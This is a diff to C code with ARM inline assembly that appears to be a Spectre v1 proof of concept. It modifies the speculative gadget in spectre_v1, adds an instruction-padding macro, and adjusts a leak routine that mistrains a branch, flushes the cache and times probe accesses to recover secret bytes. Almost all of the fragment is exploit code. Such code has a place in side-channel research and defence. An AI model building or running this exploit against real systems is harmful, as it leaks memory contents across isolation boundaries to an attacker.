@@ -17,6 +17,14 @@
         :: "i" (n) \
     )
 
+#define ADDS(n) \
+    asm volatile( \
+        ".rept %0\n" \
+        "adds x10, x10, #1\n" \
+        ".endr\n" \
+        :: "i" (n) \
+		:"x10" \
+    )
 
 unsigned int size = 16;
 uint8_t fake_buffer[16] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
@@ -35,12 +43,12 @@ uint64_t counter = 0;
 
 void spectre_v1( size_t index) {
 	size = 16;
-	pick = data;
-	NOPS(500);
+	//pick = data;
 	if (index < size)
 	{	
+		ADDS(1000);
 		
-		pick = reloadbuffer[fake_buffer[index]<< 12];
+		pick = reloadbuffer[fake_buffer[index] << 12];
 	}
 }
 
@@ -80,9 +88,6 @@ void leak(size_t target, uint8_t *byte) {
 			probe_addr = train_index ^ (probe_addr & (target ^ train_index));
 		//	cacheflush(&size);
 			cacheflush(&data);
-		//	cacheflush(&index_p1);
-		//	cacheflush(&index_p2);
-			size = 16;
 			for(volatile int z = 0; z < 100; z++){
 			}
 
@@ -98,6 +103,8 @@ void leak(size_t target, uint8_t *byte) {
 			if (measured_clock <= 160 && index != fake_buffer[tries % size])
 				results[index]++; 
 		}
+
+		
 		max = results[0];
 		for(int m = 0; m < 256; m++){
 			if(results[m] >= max){
